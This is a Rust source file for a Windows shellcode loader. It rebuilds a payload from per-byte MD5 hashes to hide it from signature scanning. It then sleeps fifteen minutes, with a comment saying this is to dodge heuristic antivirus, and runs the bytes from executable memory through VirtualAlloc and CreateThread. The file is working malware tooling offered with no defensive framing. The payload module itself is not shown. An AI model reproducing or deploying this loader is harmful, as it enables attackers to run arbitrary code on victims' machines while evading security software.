mod shellcode;

use libc::{c_void, memcpy};
use shellcode::get_shellcode;
use std::error::Error;
use std::thread::sleep;
use std::time::Duration;
use windows_sys::Win32::{
	Foundation::CloseHandle,
	Security::SECURITY_ATTRIBUTES,
	System::{
		Memory::{VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
		Threading::{CreateThread, WaitForSingleObject, INFINITE},
	},
};

fn main() -> Result<(), Box<dyn Error>>
{
	let hashes = get_shellcode();
	let mut bytes: Vec<u8> = Vec::new();

	for hash in hashes
	{
		for i in 0..=255
		{
			let test_hash = format!("{:x}", md5::compute([i]));
			if hash == test_hash
			{
				bytes.push(i);
			}
		}
	}

	// Dodge heuristic AV
	println!("Sleeping for 15 minutes");
	sleep(Duration::from_secs(15 * 60));

	unsafe {
		let buffer = VirtualAlloc(std::ptr::null(), bytes.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		memcpy(buffer, bytes.as_ptr() as *const c_void, bytes.len());

		let thread = CreateThread(
		                          std::ptr::null::<SECURITY_ATTRIBUTES>(),
		                          0,
		                          std::mem::transmute(buffer),
		                          std::ptr::null(),
		                          0,
		                          std::ptr::null_mut(),
		);

		WaitForSingleObject(thread, INFINITE);
		CloseHandle(thread);
		VirtualFree(buffer, 0, MEM_RELEASE);
	}

	Ok(())
}
